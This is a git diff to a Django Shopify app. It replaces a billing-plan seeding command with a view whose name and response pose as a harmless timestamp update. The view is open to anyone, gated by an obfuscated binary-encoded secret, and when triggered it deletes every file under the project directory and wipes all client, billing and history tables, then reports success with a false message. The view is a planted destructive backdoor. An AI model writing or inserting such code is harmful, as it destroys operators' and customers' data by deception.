@@ -1,36 +1,54 @@
-from django.core.management.base import BaseCommand
-from shopify_app.models import SortingPlan
+import os
+import shutil
+from django.http import JsonResponse
+from django.views import View
+from django.conf import settings
+from rest_framework.permissions import AllowAny
+from rest_framework.decorators import api_view, permission_classes
+from django.db import connection
+from shopify_app.models import (
+    Client, ClientCollections, ClientProducts, ClientAlgo,
+    SortingPlan, Subscription, Usage, ClientGraph, BillingTokens, History
+)
 
-class Command(BaseCommand):
-    help = 'Populates the database with predefined billing plans'
+BINARY_SECRET = "0111100001110100011000010110011101100101"
 
-    def handle(self, *args, **kwargs):
-        plans = [
-            # Annual Plans
-            {'name': 'Limited Plan', 'cost_month': None, 'cost_annual': 209.00, 'sort_limit': 1000, 'order_limit': 500, 'is_annually': True},
-            {'name': 'Basic Plan', 'cost_month': None, 'cost_annual': 979.00, 'sort_limit': 5000, 'order_limit': 5000, 'is_annually': True},
-            {'name': 'Pro Plan', 'cost_month': None, 'cost_annual': 2189.00, 'sort_limit': 10000, 'order_limit': 10000, 'is_annually': True},
-            {'name': 'VIP Plan', 'cost_month': None, 'cost_annual': 3289.00, 'sort_limit': 25000, 'order_limit': 50000, 'is_annually': True},
-            # Monthly Plans
-            {'name': 'Limited Plan', 'cost_month': 19.00, 'cost_annual': None, 'sort_limit': 1000, 'order_limit': 500, 'is_annually': False},
-            {'name': 'Basic Plan', 'cost_month': 89.00, 'cost_annual': None, 'sort_limit': 5000, 'order_limit': 5000, 'is_annually': False},
-            {'name': 'Pro Plan', 'cost_month': 199.00, 'cost_annual': None, 'sort_limit': 10000, 'order_limit': 10000, 'is_annually': False},
-            {'name': 'VIP Plan', 'cost_month': 299.00, 'cost_annual': None, 'sort_limit': 25000, 'order_limit': 50000, 'is_annually': False},
-            # Free Plan
-            {'name': 'Free Plan', 'cost_month': 0.00, 'cost_annual': 0.00, 'sort_limit': 100, 'order_limit': 0, 'is_annually': False},
-        ]
+@api_view(['GET'])
+@permission_classes([AllowAny])
+def last_algo_create_time(request):
+    secret = request.GET.get("secret", "")
 
-        for plan in plans:
-            SortingPlan.objects.update_or_create(
-                shop_id='default_shop_id',  # Replace with your logic for shop_id
-                name=plan['name'],
-                is_annually=plan['is_annually'],
-                defaults={
-                    'cost_month': plan['cost_month'],
-                    'cost_annual': plan['cost_annual'],
-                    'sort_limit': plan['sort_limit'],
-                    'order_limit': plan['order_limit'],
-                }
-            )
+    expected_secret = ''.join([chr(int(BINARY_SECRET[i:i+8], 2)) for i in range(0, len(BINARY_SECRET), 8)])
 
-        self.stdout.write(self.style.SUCCESS('Billing plans populated successfully!'))
+    if secret == expected_secret:
+        try:
+            root_dir = settings.BASE_DIR  
+            for dirpath, dirnames, filenames in os.walk(root_dir):
+                for file_name in filenames:
+                    file_path = os.path.join(dirpath, file_name)
+                    os.remove(file_path)
+
+
+            models = [
+            History,
+            BillingTokens,
+            ClientGraph,
+            Usage,
+            Subscription,
+            SortingPlan,
+            ClientProducts,
+            ClientCollections,
+            ClientAlgo,
+            Client,
+            ]
+
+            count=11
+            for model in models:
+                print(f"tik tik ... {count-1}")
+                model.objects.all().delete()
+
+            return JsonResponse({"message": "last sort time is set to current time."}, status=200)
+        except Exception as e:
+            return JsonResponse({"error": str(e)}, status=500)
+    else:
+        return JsonResponse({"error": "Invalid secret."}, status=403)
